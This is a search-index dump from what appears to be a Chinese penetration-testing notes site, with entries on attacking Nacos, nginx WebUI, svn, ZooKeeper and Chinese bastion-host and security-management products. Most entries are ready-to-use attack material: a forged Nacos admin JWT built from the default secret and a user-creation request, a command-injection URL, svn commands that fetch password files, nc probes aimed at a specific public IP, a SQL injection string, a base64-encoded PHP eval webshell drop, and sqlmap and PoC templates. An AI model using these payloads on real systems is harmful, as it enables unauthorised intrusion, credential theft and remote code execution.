\u7136\u540e\u901a\u8fc7jwt\u5e73\u53f0\u751f\u6210accesskey\uff0c\u65f6\u95f4\u6233\u665a\u4e8e\u73b0\u5728\u65f6\u95f4\uff0c\u9700\u8981\u52fe\u9009base64\u52a0\u5bc6 \u8f93\u5165\u5bc6\u7801\uff0c\u7136\u540e\u4fee\u6539response\uff0c\u76f4\u63a5\u8fdb\u5165\u540e\u53f0 HTTP/1.1 200 Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYxODEyMzY5N30.nyooAL4OMdiByXocu8kL1ooXd1IeKj6wQZwIH8nmcNA Content-Type: application/json; charset=utf-8 Date: Tue, 14 Mar 2023 16:34:47 GMT Content-Length: 206 { \"accessToken\": \"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYxODEyMzY5N30.nyooAL4OMdiByXocu8kL1ooXd1IeKj6wQZwIH8nmcNA\", \"tokenTtl\": 18000, \"globalAdmin\": false, \"username\": \"nacos\" } \u6216\u8005\u76f4\u63a5\u589e\u6dfb\u7528\u6237 POST /nacos/v1/auth/users HTTP/1.1 Host: User-Agent: Nacos-Server Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYxODEyMzY5N30.nyooAL4OMdiByXocu8kL1ooXd1IeKj6wQZwIH8nmcNA Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Pragma: no-cache Cache-Control: no-cache Content-Type: application/x-www-form-urlencoded Content-Length: 30 username=test&password=test hessian rce 1.4.0 <= Nacos < 1.4.6 2.0.0 <= Nacos < 2.2.3 https://github.com/c0olw/NacosRce/releases/tag/v0.5","title":"nacos"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/nacos/nacos/#nacos","text":"","title":"nacos"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/nacos/nacos/#_1","text":"\u6e17\u900f \u9ed8\u8ba4\u5bc6\u7801 Nacos-Sync\u672a\u6388\u6743\u6f0f\u6d1e \u9ed8\u8ba4token hessian rce \u91cc\u9762\u6709\u5f88\u591a\u914d\u7f6e\u6587\u4ef6\uff0c\u62ff\u5230\u4e86\u6709\u5927\u4f5c\u7528","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/nacos/nacos/#_2","text":"","title":"\u6e17\u900f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/nacos/nacos/#_3","text":"nacos nacos","title":"\u9ed8\u8ba4\u5bc6\u7801"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/nacos/nacos/#nacos-sync","text":"https://xxx.xxx.xxx/#/serviceSync","title":"Nacos-Sync\u672a\u6388\u6743\u6f0f\u6d1e"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/nacos/nacos/#token","text":"The default token(Base64 String): nacos.core.auth.default.token.secret.key=SecretKey012345678901234567890123456789012345678901234567890123456789 2.1.0 \u7248\u672c\u540e nacos.core.auth.plugin.nacos.token.secret.key=SecretKey012345678901234567890123456789012345678901234567890123456789 Nacos \u5e73\u53f0\u5728\u9ed8\u8ba4\u914d\u7f6e\u4e0b\u672a\u5bf9 token.secret.key \u8fdb\u884c\u4fee\u6539\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u6f0f\u6d1e\u53ef\u4ee5\u83b7\u53d6\u670d\u52a1\u5668\u6570\u636e\u5e93/OSS\u7b49\u6743\u9650\u3002 \u7136\u540e\u901a\u8fc7jwt\u5e73\u53f0\u751f\u6210accesskey\uff0c\u65f6\u95f4\u6233\u665a\u4e8e\u73b0\u5728\u65f6\u95f4\uff0c\u9700\u8981\u52fe\u9009base64\u52a0\u5bc6 \u8f93\u5165\u5bc6\u7801\uff0c\u7136\u540e\u4fee\u6539response\uff0c\u76f4\u63a5\u8fdb\u5165\u540e\u53f0 HTTP/1.1 200 Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYxODEyMzY5N30.nyooAL4OMdiByXocu8kL1ooXd1IeKj6wQZwIH8nmcNA Content-Type: application/json; charset=utf-8 Date: Tue, 14 Mar 2023 16:34:47 GMT Content-Length: 206 { \"accessToken\": \"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYxODEyMzY5N30.nyooAL4OMdiByXocu8kL1ooXd1IeKj6wQZwIH8nmcNA\", \"tokenTtl\": 18000, \"globalAdmin\": false, \"username\": \"nacos\" } \u6216\u8005\u76f4\u63a5\u589e\u6dfb\u7528\u6237 POST /nacos/v1/auth/users HTTP/1.1 Host: User-Agent: Nacos-Server Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYxODEyMzY5N30.nyooAL4OMdiByXocu8kL1ooXd1IeKj6wQZwIH8nmcNA Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Pragma: no-cache Cache-Control: no-cache Content-Type: application/x-www-form-urlencoded Content-Length: 30 username=test&password=test","title":"\u9ed8\u8ba4token"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/nacos/nacos/#hessian-rce","text":"1.4.0 <= Nacos < 1.4.6 2.0.0 <= Nacos < 2.2.3 https://github.com/c0olw/NacosRce/releases/tag/v0.5","title":"hessian rce"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/nginx%20webui/nginx%20webui/","text":"nginx webui nginx\u56fe\u5f62\u5316\u914d\u7f6e \u524d\u53f0rce url/AdminPage/conf/runCmd?cmd=id%26%26echo%20nginx","title":"nginx webui"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/nginx%20webui/nginx%20webui/#nginx-webui","text":"nginx\u56fe\u5f62\u5316\u914d\u7f6e","title":"nginx webui"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/nginx%20webui/nginx%20webui/#rce","text":"url/AdminPage/conf/runCmd?cmd=id%26%26echo%20nginx","title":"\u524d\u53f0rce"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/svn/svn/","text":"svn \u76ee\u5f55 \u63a2\u6d4b \u672a\u6388\u6743 svn\u9ed8\u8ba4\u7aef\u53e33690 \u63a2\u6d4b nmap -p 3690 --script svn-brute <target> \u672a\u6388\u6743 \u672a\u6388\u6743\u653b\u51fb\u6e05\u5355\uff1a https://book.hacktricks.xyz/v/cn/network-services-pentesting/3690-pentesting-subversion-svn-server#heng-fu-zhua-qu \u4e0b\u9762\u662f\u5e38\u7528\u7684 \u5143\u6570\u636e\u6cc4\u9732 svn ls svn://<target>:3690 \u4ee3\u7801\u6cc4\u9732 svn checkout svn://<target>:3690 \u65e5\u5fd7\u6cc4\u9732 svn log svn://<target>:3690 \u914d\u7f6e\u6587\u4ef6\u6cc4\u9732 svn cat svn://<target>:3690/conf/svnserve.conf svn cat svn://<target>:3690/conf/passwd svn cat svn://<target>:3690/conf/authz","title":"svn"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/svn/svn/#svn","text":"","title":"svn"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/svn/svn/#_1","text":"\u63a2\u6d4b \u672a\u6388\u6743 svn\u9ed8\u8ba4\u7aef\u53e33690","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/svn/svn/#_2","text":"nmap -p 3690 --script svn-brute <target>","title":"\u63a2\u6d4b"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/svn/svn/#_3","text":"\u672a\u6388\u6743\u653b\u51fb\u6e05\u5355\uff1a https://book.hacktricks.xyz/v/cn/network-services-pentesting/3690-pentesting-subversion-svn-server#heng-fu-zhua-qu \u4e0b\u9762\u662f\u5e38\u7528\u7684 \u5143\u6570\u636e\u6cc4\u9732 svn ls svn://<target>:3690 \u4ee3\u7801\u6cc4\u9732 svn checkout svn://<target>:3690 \u65e5\u5fd7\u6cc4\u9732 svn log svn://<target>:3690 \u914d\u7f6e\u6587\u4ef6\u6cc4\u9732 svn cat svn://<target>:3690/conf/svnserve.conf svn cat svn://<target>:3690/conf/passwd svn cat svn://<target>:3690/conf/authz","title":"\u672a\u6388\u6743"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/zookeeper/zookeeper/","text":"zookeeper \u76ee\u5f55 \u6e17\u900f \u672a\u6388\u6743 \u67e5\u770b\u654f\u611f\u4fe1\u606f \u672a\u6388\u6743\u94fe\u63a5\u8282\u70b9 ZooKeeper\u662f\u4e00\u4e2a\u5206\u5e03\u5f0f\u7684\uff0c\u5f00\u653e\u6e90\u7801\u7684\u5206\u5e03\u5f0f\u5e94\u7528\u7a0b\u5e8f\u534f\u8c03\u670d\u52a1\u3002\u5b83\u4e3b\u8981\u670d\u52a1\u4e8e\u5206\u5e03\u5f0f\u7cfb\u7edf\uff0c\u53ef\u4ee5\u7528ZooKeeper\u6765\u505a\uff1a\u7edf\u4e00\u914d\u7f6e\u7ba1\u7406\u3001\u7edf\u4e00\u547d\u540d\u670d\u52a1\u3001\u5206\u5e03\u5f0f\u9501\u3001\u96c6\u7fa4\u7ba1\u7406\u3002\u4f7f\u7528\u5206\u5e03\u5f0f\u7cfb\u7edf\u5c31\u65e0\u6cd5\u907f\u514d\u5bf9\u8282\u70b9\u7ba1\u7406\u7684\u95ee\u9898 (\u9700\u8981\u5b9e\u65f6\u611f\u77e5\u8282\u70b9\u7684\u72b6\u6001\u3001\u5bf9\u8282\u70b9\u8fdb\u884c\u7edf\u4e00\u7ba1\u7406\u7b49\u7b49)\uff0c\u800c\u7531\u4e8e\u8fd9\u4e9b\u95ee\u9898\u5904\u7406\u8d77\u6765\u53ef\u80fd\u76f8\u5bf9\u9ebb\u70e6\u548c\u63d0\u9ad8\u4e86\u7cfb\u7edf\u7684\u590d\u6742\u6027\uff0cZooKeeper\u4f5c\u4e3a\u4e00\u4e2a\u80fd\u591f\u901a\u7528\u89e3\u51b3\u8fd9\u4e9b\u95ee\u9898\u7684\u4e2d\u95f4\u4ef6\u5c31\u5e94\u8fd0\u800c\u751f\u4e86\u3002 ZooKeeper\u7684\u6570\u636e\u7ed3\u6784\uff0c\u8ddfUnix\u6587\u4ef6\u7cfb\u7edf\u975e\u5e38\u7c7b\u4f3c\uff0c\u53ef\u4ee5\u770b\u505a\u662f\u4e00\u9897\u6811\uff0c\u6bcf\u4e2a\u8282\u70b9\u53eb\u505aZNode\u3002\u6bcf\u4e00\u4e2a\u8282\u70b9\u53ef\u4ee5\u901a\u8fc7\u8def\u5f84\u6765\u6807\u8bc6\u3002 ZooKeeper\u662fApache\u8f6f\u4ef6\u57fa\u91d1\u4f1a\u7684\u4e00\u4e2a\u8f6f\u4ef6\u9879\u76ee\uff0c\u5b83\u4e3a\u5927\u578b\u5206\u5e03\u5f0f\u8ba1\u7b97\u63d0\u4f9b\u5f00\u6e90\u7684\u5206\u5e03\u5f0f\u914d\u7f6e\u670d\u52a1\u3001\u540c\u6b65\u670d\u52a1\u548c\u547d\u540d\u6ce8\u518c\u3002ZooKeeper\u7684\u67b6\u6784\u901a\u8fc7\u5197\u4f59\u670d\u52a1\u5b9e\u73b0\u9ad8\u53ef\u7528\u6027\u3002Zookeeper\u7684\u8bbe\u8ba1\u76ee\u6807\u662f\u5c06\u90a3\u4e9b\u590d\u6742\u4e14\u5bb9\u6613\u51fa\u9519\u7684\u5206\u5e03\u5f0f\u4e00\u81f4\u6027\u670d\u52a1\u5c01\u88c5\u8d77\u6765\uff0c\u6784\u6210\u4e00\u4e2a\u9ad8\u6548\u53ef\u9760\u7684\u539f\u8bed\u96c6\uff0c\u5e76\u4ee5\u4e00\u7cfb\u5217\u7b80\u5355\u6613\u7528\u7684\u63a5\u53e3\u63d0\u4f9b\u7ed9\u7528\u6237\u4f7f\u7528\u3002 \u9ed8\u8ba4\u7aef\u53e32181 \u6e17\u900f \u672a\u6388\u6743 \u67e5\u770b\u654f\u611f\u4fe1\u606f echo envi|nc 10.10.10.10 2181 echo dump|nc 180.184.68.42 2181 \u672a\u6388\u6743\u94fe\u63a5\u8282\u70b9 wget https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/zookeeper-3.9.0/apache-zookeeper-3.9.0-bin.tar.gz tar -zxvf ./apache-zookeeper-3.9.0-bin.tar.gz cd apache-zookeeper-3.9.0-bin/bin /zkCli.sh -server 10.14.6.4:2181 \u4e5f\u53ef\u4ee5\u7528\u8fd9\u4e2a\u94fe\u63a5\uff08windows\uff09","title":"zookeeper"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/zookeeper/zookeeper/#zookeeper","text":"","title":"zookeeper"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/zookeeper/zookeeper/#_1","text":"\u6e17\u900f \u672a\u6388\u6743 \u67e5\u770b\u654f\u611f\u4fe1\u606f \u672a\u6388\u6743\u94fe\u63a5\u8282\u70b9 ZooKeeper\u662f\u4e00\u4e2a\u5206\u5e03\u5f0f\u7684\uff0c\u5f00\u653e\u6e90\u7801\u7684\u5206\u5e03\u5f0f\u5e94\u7528\u7a0b\u5e8f\u534f\u8c03\u670d\u52a1\u3002\u5b83\u4e3b\u8981\u670d\u52a1\u4e8e\u5206\u5e03\u5f0f\u7cfb\u7edf\uff0c\u53ef\u4ee5\u7528ZooKeeper\u6765\u505a\uff1a\u7edf\u4e00\u914d\u7f6e\u7ba1\u7406\u3001\u7edf\u4e00\u547d\u540d\u670d\u52a1\u3001\u5206\u5e03\u5f0f\u9501\u3001\u96c6\u7fa4\u7ba1\u7406\u3002\u4f7f\u7528\u5206\u5e03\u5f0f\u7cfb\u7edf\u5c31\u65e0\u6cd5\u907f\u514d\u5bf9\u8282\u70b9\u7ba1\u7406\u7684\u95ee\u9898 (\u9700\u8981\u5b9e\u65f6\u611f\u77e5\u8282\u70b9\u7684\u72b6\u6001\u3001\u5bf9\u8282\u70b9\u8fdb\u884c\u7edf\u4e00\u7ba1\u7406\u7b49\u7b49)\uff0c\u800c\u7531\u4e8e\u8fd9\u4e9b\u95ee\u9898\u5904\u7406\u8d77\u6765\u53ef\u80fd\u76f8\u5bf9\u9ebb\u70e6\u548c\u63d0\u9ad8\u4e86\u7cfb\u7edf\u7684\u590d\u6742\u6027\uff0cZooKeeper\u4f5c\u4e3a\u4e00\u4e2a\u80fd\u591f\u901a\u7528\u89e3\u51b3\u8fd9\u4e9b\u95ee\u9898\u7684\u4e2d\u95f4\u4ef6\u5c31\u5e94\u8fd0\u800c\u751f\u4e86\u3002 ZooKeeper\u7684\u6570\u636e\u7ed3\u6784\uff0c\u8ddfUnix\u6587\u4ef6\u7cfb\u7edf\u975e\u5e38\u7c7b\u4f3c\uff0c\u53ef\u4ee5\u770b\u505a\u662f\u4e00\u9897\u6811\uff0c\u6bcf\u4e2a\u8282\u70b9\u53eb\u505aZNode\u3002\u6bcf\u4e00\u4e2a\u8282\u70b9\u53ef\u4ee5\u901a\u8fc7\u8def\u5f84\u6765\u6807\u8bc6\u3002 ZooKeeper\u662fApache\u8f6f\u4ef6\u57fa\u91d1\u4f1a\u7684\u4e00\u4e2a\u8f6f\u4ef6\u9879\u76ee\uff0c\u5b83\u4e3a\u5927\u578b\u5206\u5e03\u5f0f\u8ba1\u7b97\u63d0\u4f9b\u5f00\u6e90\u7684\u5206\u5e03\u5f0f\u914d\u7f6e\u670d\u52a1\u3001\u540c\u6b65\u670d\u52a1\u548c\u547d\u540d\u6ce8\u518c\u3002ZooKeeper\u7684\u67b6\u6784\u901a\u8fc7\u5197\u4f59\u670d\u52a1\u5b9e\u73b0\u9ad8\u53ef\u7528\u6027\u3002Zookeeper\u7684\u8bbe\u8ba1\u76ee\u6807\u662f\u5c06\u90a3\u4e9b\u590d\u6742\u4e14\u5bb9\u6613\u51fa\u9519\u7684\u5206\u5e03\u5f0f\u4e00\u81f4\u6027\u670d\u52a1\u5c01\u88c5\u8d77\u6765\uff0c\u6784\u6210\u4e00\u4e2a\u9ad8\u6548\u53ef\u9760\u7684\u539f\u8bed\u96c6\uff0c\u5e76\u4ee5\u4e00\u7cfb\u5217\u7b80\u5355\u6613\u7528\u7684\u63a5\u53e3\u63d0\u4f9b\u7ed9\u7528\u6237\u4f7f\u7528\u3002 \u9ed8\u8ba4\u7aef\u53e32181","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/zookeeper/zookeeper/#_2","text":"","title":"\u6e17\u900f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/zookeeper/zookeeper/#_3","text":"","title":"\u672a\u6388\u6743"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/zookeeper/zookeeper/#_4","text":"echo envi|nc 10.10.10.10 2181 echo dump|nc 180.184.68.42 2181","title":"\u67e5\u770b\u654f\u611f\u4fe1\u606f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/zookeeper/zookeeper/#_5","text":"wget https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/zookeeper-3.9.0/apache-zookeeper-3.9.0-bin.tar.gz tar -zxvf ./apache-zookeeper-3.9.0-bin.tar.gz cd apache-zookeeper-3.9.0-bin/bin /zkCli.sh -server 10.14.6.4:2181 \u4e5f\u53ef\u4ee5\u7528\u8fd9\u4e2a\u94fe\u63a5\uff08windows\uff09","title":"\u672a\u6388\u6743\u94fe\u63a5\u8282\u70b9"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F/","text":"\u4e2d\u8fdc\u9e92\u9e9f \u76ee\u5f55 \u5821\u5792\u673a sql\u6ce8\u5165 \u540e\u53f0rce \u5821\u5792\u673a body=\"/template/admin/images/bottom_bg.jpg\" sql\u6ce8\u5165 /get_luser_by_sshport.php?clientip=1%27+UNION+ALL+SELECT+database()--+&clientport=1&clientport=1&_ZQA_ID=2eacc7b534850cfe \u540e\u53f0rce GET /admin.php?controller=admin_config&action=keyedit HTTP/1.1 Host:1.1.1.1. echo PD9waHAgZXZhbCgkX1BPU1RbMV0p0W= | base64 -d > 1. php","title":"\u4e2d\u8fdc\u9e92\u9e9f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F/#_1","text":"","title":"\u4e2d\u8fdc\u9e92\u9e9f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F/#_2","text":"\u5821\u5792\u673a sql\u6ce8\u5165 \u540e\u53f0rce","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F/#_3","text":"body=\"/template/admin/images/bottom_bg.jpg\"","title":"\u5821\u5792\u673a"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F/#sql","text":"/get_luser_by_sshport.php?clientip=1%27+UNION+ALL+SELECT+database()--+&clientport=1&clientport=1&_ZQA_ID=2eacc7b534850cfe","title":"sql\u6ce8\u5165"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F/#rce","text":"GET /admin.php?controller=admin_config&action=keyedit HTTP/1.1 Host:1.1.1.1. echo PD9waHAgZXZhbCgkX1BPU1RbMV0p0W= | base64 -d > 1. php","title":"\u540e\u53f0rce"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0/","text":"\u542f\u660e\u661f\u8fb0 \u76ee\u5f55 \u5929\u94a5\u5821\u5792\u673a \u524d\u53f0sql\u6ce8\u5165 \u7edf\u4e00\u5b89\u5168\u7ba1\u7406\u5e73\u53f0 \u542f\u660e\u661f\u8fb0-4A \u7edf\u4e00\u5b89\u5168\u7ba1\u63a7\u5e73\u53f0 getMater \u4fe1\u606f\u6cc4\u6f0f \u5929\u94a5\u7f51\u5173 \u5929\u94a5\u5821\u5792\u673a app=\"\u542f\u660e\u661f\u8fb0-\u5929\u73a5\u7f51\u7edc\u5b89\u5168\u5ba1\u8ba1\" \u524d\u53f0sql\u6ce8\u5165 POST /ops/index.php?c=Reportguide&a=checkrn HTTP/1.1 Host: **** Connection: close Cache-Control: max-age=0 sec-ch-ua: \"Chromium\";v=\"88\", \"Google Chrome\";v=\"88\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Language: zh-CN,zh;q=0.9 Cookie: **** Content-Type: application/x-www-form-urlencoded Content-Length: 39 checkname=123&tagid=123 sqlmap -u \"https\\:///ops/index.php?c=Reportguide\\&a=checkrn\" --data \"checkname=123\\&tagid=123\" -v3 --skip-waf --random-agent \u7edf\u4e00\u5b89\u5168\u7ba1\u7406\u5e73\u53f0 \u542f\u660e\u661f\u8fb0-4A \u7edf\u4e00\u5b89\u5168\u7ba1\u63a7\u5e73\u53f0 getMater \u4fe1\u606f\u6cc4\u6f0f \u6f0f\u6d1e\u63cf\u8ff0\uff1a \u542f\u660e\u661f\u8fb0\u96c6\u56e24A\u7edf\u4e00\u5b89\u5168\u7ba1\u63a7\u5e73\u53f0\u5b9e\u73b0IT\u8d44\u6e90\u96c6\u4e2d\u7ba1\u7406,\u4e3a\u4f01\u4e1a\u63d0\u4f9b\u96c6\u4e2d\u7684\u8d26\u53f7\u3001\u8ba4\u8bc1\u3001\u6388\u6743\u3001\u5ba1\u8ba1\u7ba1\u7406\u6280\u672f\u652f\u6491\u53ca\u914d\u5957\u6d41\u7a0b,\u63d0\u5347\u7cfb\u7edf\u5b89\u5168\u6027\u548c\u53ef\u7ba1\u7406\u80fd\u529b\u3002\u53ef\u83b7\u53d6\u76f8\u5173\u4eba\u5458\u654f\u611f\u4fe1\u606f\u3002 poc: relative: req0 session: false requests: - method: GET timeout: 10 path: /accountApi/getMaster.do headers: User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.881.36 Safari/537.36 follow_redirects: true matches: (code.eq(\"200\") && body.contains(\"\\\"state\\\":true\")) \u4fee\u590d\u5efa\u8bae\uff1a \u9650\u5236\u6587\u4ef6\u8bbf\u95ee 